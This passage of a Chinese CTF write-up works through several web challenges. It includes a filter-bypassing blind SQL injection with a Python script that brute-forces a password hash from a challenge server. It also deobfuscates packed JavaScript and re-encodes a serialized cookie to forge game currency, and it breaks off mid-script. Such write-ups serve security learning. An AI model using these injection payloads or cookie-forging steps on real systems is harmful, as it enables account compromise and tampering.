<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>
<span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span>
<span class="hljs-attribute">Cookie</span>: ISecer=s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-attribute">Connection</span>: close</code></pre></div>



<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>提示：</p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>带有过滤的sql注入</p>
<p>先测试一下过滤哪些字符</p>
<p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" srcset="/img/loading.gif" alt="sql2-2.png"></p>
<p>测试发现  or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符</p>
<p>测试还可以发现，当uname=admin&amp;passwd=111时提示的password error ,</p>
<p>但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。</p>
<p>当uname=admin’-1-‘&amp;passwd=11时为false</p>
<p>当uname=admin’-0-‘&amp;passwd=1时为true</p>
<p>所以猜测sql查询语句为</p>
<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre></div>

<h3 id="尝试构造注入语句"><a href="#尝试构造注入语句" class="headerlink" title="尝试构造注入语句"></a>尝试构造注入语句</h3><div class="hljs"><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre></div>

<p>上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置</p>
<p>但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句</p>
<div class="hljs"><pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre></div>

<p>reverse 为字符串反转函数</p>
<p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" srcset="/img/loading.gif" alt="sql2-1.png"></p>
<p>确定盲注的判断条件</p>
<p>当上面的语句成立时返回的是 username error </p>
<p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" srcset="/img/loading.gif" alt="sql2-4.png"></p>
<p>不成立时返回的是password  error  </p>
<p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" srcset="/img/loading.gif" alt="sql-3.png"></p>
<p>编写脚本</p>
<p>因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&quot;http://123.206.87.240:8007/web2/login.php&quot;</span>
cookie =&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;r3rln64ialiqjnefpa6qu5a0t513t8rs&#x27;</span>&#125;
password = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:
        payload = <span class="hljs-string">&quot;admin&#x27;-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(j))
        data=&#123;<span class="hljs-string">&#x27;uname&#x27;</span>:payload,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&quot;111&quot;</span>&#125;
        res = requests.post(url=url,cookies=cookie,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> res.text:
            password +=j
            <span class="hljs-comment">#print(password)</span>
            <span class="hljs-keyword">break</span>
print(password)</code></pre></div>

<p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" srcset="/img/loading.gif" alt="sql2-5.png"></p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">005b81fd960f61505237dbb7a3202910</span>
<span class="hljs-attribute">md5</span>在线解码后为admin<span class="hljs-number">123</span></code></pre></div>

<p>登录后即可用ls命令，就可以拿到flag</p>
<p>这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破</p>
<p>参考叶师傅：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2583">https://xz.aliyun.com/t/2583</a></p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>进入页面是一个博客的页面，有搜索功能，没有思路</p>
<p>于是扫描目录</p>
<p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" srcset="/img/loading.gif" alt="blog.png"></p>
<p>但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>tips:不要一次就放弃</p>
<p>是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法</p>
<p>那就万事不觉扫以下</p>
<p>还真有发现</p>
<p>扫到三个目录</p>
<p>login.php</p>
<p>register.php</p>
<p>show.php</p>
<p>访问show.php,拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" srcset="/img/loading.gif" alt="trim.png"></p>
<h2 id="login2-SKCTF-login3-文件上传2-login4"><a href="#login2-SKCTF-login3-文件上传2-login4" class="headerlink" title="login2(SKCTF)  login3  文件上传2  login4"></a>login2(SKCTF)  login3  文件上传2  login4</h2><p>题目都挂了</p>
<h2 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h2><p>提示:学会如来神掌就可以打败他了吧</p>
<p>进入题目发现还真像是游戏的界面</p>
<p>包含属性 练功 商店 赚钱 讨伐 退出 几个页面</p>
<p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" srcset="/img/loading.gif" alt="mt-1.png"></p>
<p>其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag</p>
<p><strong>查看源码</strong>    </p>
<p>在wulin.php中可以看到三个js文件</p>
<p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" srcset="/img/loading.gif" alt="mt-2.png"></p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-comment">//script.js 在线格式化后的结果</span>


<span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;
	e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;
		<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">&#x27;&#x27;</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))
	&#125;;
	<span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;0&#x27;</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;
		<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];
		k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;
			<span class="hljs-keyword">return</span> r[e] || e
		&#125;];
		e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
			<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;[57-9abd-hj-zAB]&#x27;</span>
		&#125;;
		c = <span class="hljs-number">1</span>
	&#125;;
	<span class="hljs-keyword">while</span> (c--)
		<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + e(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), k[c]);
	<span class="hljs-keyword">return</span> p
&#125;(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre></div>

<p>可以看到<code>function(p, a, c, k, e, r)</code>函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。</p>
<div class="hljs"><pre><code class="hljs js">(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;)
</code></pre></div>



<p>删除eval在浏览器的控制台跑出的结果</p>
<p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" srcset="/img/loading.gif" alt="mt-4.png"></p>
<p>在线代码格式化后如下</p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;
    <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">&quot;=&quot;</span>;
    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">var</span> c = ca[i].trim();
        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;
    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();
    <span class="hljs-keyword">var</span> result = base.decode(temp);
    <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;
        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);
        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)
    &#125;
    <span class="hljs-keyword">return</span> result3
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">&quot;user&quot;</span>;
    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);
    temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);
    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);
    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">&#x27;;&#x27;</span>);
    <span class="hljs-keyword">var</span> key = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">if</span> (-<span class="hljs-number">1</span> &lt; ca[i].indexOf(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;
            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">2</span>]
        &#125;
    &#125;
    key = key.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>);
    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-2.jpg&quot;</span>
    &#125;, <span class="hljs-number">1000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-3.jpg&quot;</span>
    &#125;, <span class="hljs-number">2000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-4.jpg&quot;</span>
    &#125;, <span class="hljs-number">3000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/6.png&quot;</span>
    &#125;, <span class="hljs-number">4000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        alert(<span class="hljs-string">&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot;</span> + md5(key) + <span class="hljs-string">&quot;&#125;&quot;</span>)    <span class="hljs-comment">//发现了flag字段  </span>
    &#125;, <span class="hljs-number">5000</span>)
&#125;</code></pre></div>

<p>首先在控制台中获取cookie</p>
<div class="hljs"><pre><code class="hljs abnf">getCookie(<span class="hljs-string">&quot;user&quot;</span>)<span class="hljs-comment">;</span>
</code></pre></div>



<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" srcset="/img/loading.gif" alt></p>
<p>获取cookie，使用上面的js代码一步一步解码</p>
<p>最后会获取序列化后的一串字符串</p>
<p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" srcset="/img/loading.gif" alt="mt-5.png"></p>
<p>最后解出来的cookie值</p>
<div class="hljs"><pre><code class="hljs css">O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;human&quot;</span>:<span class="hljs-number">10</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;xueliang&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">615</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;neili&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">657</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lidao&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">76</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dingli&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">72</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;waigong&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;neigong&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;jingyan&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;yelian&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;money&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;0&quot;</span>;&#125;</code></pre></div>

<p>但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag</p>
<p>改cookie的方法就是将明文逆向编码：</p>
<p>刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。<br>猜想一定是base64.js有问题：</p>
<p>发现加密过程并不对应，encode调用了_utf8_encode<br>但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改</p>
<p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" srcset="/img/loading.gif" alt="mt-7.png"></p>
<p><strong>修改后的反编码过程</strong>，将其放到html文件中，浏览器运行即可出结果</p>
<div class="hljs"><pre><code class="hljs html">//1.html
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>

<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span>(<span class="hljs-params"></span>) </span>&#123;</span>
 
<span class="javascript">	<span class="hljs-comment">// private property</span></span>
<span class="javascript">	_keyStr = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span>
 
<span class="javascript">	<span class="hljs-comment">// public method for encoding</span></span>
<span class="javascript">	<span class="hljs-built_in">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		<span class="hljs-comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span>
<span class="javascript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 &gt;&gt; 2;
			enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);
			enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);
			enc4 = chr3 &amp; 63;
<span class="javascript">			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>
				enc3 = enc4 = 64;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>
				enc4 = 64;
			&#125;
			output = output +
			_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
			_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
		&#125;
<span class="javascript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="javascript">	<span class="hljs-comment">// public method for decoding</span></span>
<span class="javascript">	<span class="hljs-built_in">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span>
<span class="javascript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			enc1 = _keyStr.indexOf(input.charAt(i++));
			enc2 = _keyStr.indexOf(input.charAt(i++));
			enc3 = _keyStr.indexOf(input.charAt(i++));
			enc4 = _keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);
			chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);
			chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;
<span class="javascript">			output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>
			if (enc3 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>
			&#125;
			if (enc4 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>
			&#125;
		&#125;
<span class="javascript">		<span class="hljs-comment">//output = _utf8_decode(output);</span></span>
<span class="javascript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="javascript">	<span class="hljs-comment">// private method for UTF-8 encoding</span></span>
<span class="javascript">	_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">string</span>) </span>&#123;</span>
<span class="javascript">		string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">&quot;\n&quot;</span>);</span>
<span class="javascript">		<span class="hljs-keyword">var</span> utftext = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span>
<span class="javascript">			<span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>
			if (c &lt; 128) &#123;
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
			&#125;
 
		&#125;
<span class="javascript">		<span class="hljs-keyword">return</span> utftext;</span>
	&#125;
 
<span class="javascript">	<span class="hljs-comment">// private method for UTF-8 decoding</span></span>
<span class="javascript">	_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">utftext</span>) </span>&#123;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> string = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span>
<span class="javascript">		<span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>
			c = utftext.charCodeAt(i);
			if (c &lt; 128) &#123;
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
				i++;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>
				c2 = utftext.charCodeAt(i+1);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>
				i += 2;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
				c2 = utftext.charCodeAt(i+1);
				c3 = utftext.charCodeAt(i+2);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>
				i += 3;
			&#125;
		&#125;
<span class="javascript">		<span class="hljs-keyword">return</span> string;</span>
	&#125;
&#125;


<span class="javascript"><span class="hljs-comment">//原来cookie</span></span>
